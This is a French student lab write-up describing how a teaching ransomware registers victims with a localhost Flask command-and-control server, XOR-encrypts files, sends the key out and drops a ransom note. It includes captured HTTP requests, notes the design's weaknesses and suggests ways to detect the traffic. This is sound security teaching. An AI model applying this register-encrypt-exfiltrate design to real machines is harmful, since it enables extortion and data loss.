# Schéma de Communication — Ransomware ↔ Serveur C2
# TP Jour 5 — Étape 3
# Équipe : Djimy DONKENG

## Schéma d'Architecture

```
┌─────────────────────────┐                    ┌──────────────────────────┐
│                         │                    │                          │
│   VICTIME               │                    │   SERVEUR C2             │
│   (Machine infectée)    │                    │   127.0.0.1:5000         │
│                         │                    │   (Flask / Python)       │
└────────────┬────────────┘                    └──────────────┬───────────┘
             │                                                │
             │  1. Génération victim_id                       │
             │     VICTIM_<hostname>_<timestamp>              │
             │                                                │
             │──── POST /api/register ────────────────────>  │
             │     {"victim_id": "VICTIM_student-vm_...",     │
             │      "hostname": "student-vm",                 │
             │      "timestamp": 1734444225}                  │
             │                                                │
             │  <─── {"status": "success", "id": 1} ──────── │
             │                                                │
             │  2. Chiffrement XOR des fichiers               │
             │     (.txt, .pdf, .docx, .xlsx, .jpg, .png)     │
             │     Clé : Sup3rS3cr3tK3y2024!                  │
             │                                                │
             │──── POST /api/key ─────────────────────────>  │
             │     {"victim_id": "VICTIM_student-vm_...",     │
             │      "key": "Sup3rS3cr3tK3y2024!"}             │
             │                                                │
             │  <─── {"status": "success", "key_id": 1} ──── │
             │                                                │
             │  3. Dépôt de la note de rançon                 │
             │     README_RANSOM.txt                          │
             │                                                │
```

## Timeline de l'Attaque (Ordre Chronologique)

1. Génération du victim_id (VICTIM_hostname_timestamp)
2. Enregistrement de la victime → POST /api/register
3. Scan du répertoire cible (recherche .txt .pdf .docx etc.)
4. Chiffrement XOR de chaque fichier → renommage en .encrypted
5. Envoi de la clé au C2 → POST /api/key
6. Affichage de la note de rançon (README_RANSOM.txt)

## Exemple de Requête HTTP Capturée

### Requête 1 — Enregistrement
```
POST /api/register HTTP/1.1
Host: localhost:5000
User-Agent: curl/7.81.0
Content-Type: application/json
Content-Length: 98

{"victim_id": "VICTIM_student-vm_1734444225", "hostname": "student-vm", "timestamp": 1734444225}
```

### Requête 2 — Exfiltration de la clé
```
POST /api/key HTTP/1.1
Host: localhost:5000
User-Agent: curl/7.81.0
Content-Type: application/json
Content-Length: 78

{"victim_id": "VICTIM_student-vm_1734444225", "key": "Sup3rS3cr3tK3y2024!"}
```

## Faiblesses Identifiées dans la Communication

1. **Pas de chiffrement TLS** : la clé de chiffrement transite en clair → interceptable avec tcpdump/Wireshark
2. **Pas d'authentification** : n'importe qui connaissant les endpoints peut récupérer les clés
3. **C2 local (localhost)** : dans un vrai ransomware, le C2 serait sur un serveur distant avec domaine, souvent via Tor

## Comment Détecter ce Trafic ?

- Règle firewall bloquant le port 5000 sortant
- IDS/IPS (Snort, Suricata) avec règles sur /api/register et /api/key
- Proxy d'entreprise inspectant le trafic HTTP
- Analyse comportementale (POST JSON répétés vers une même IP)
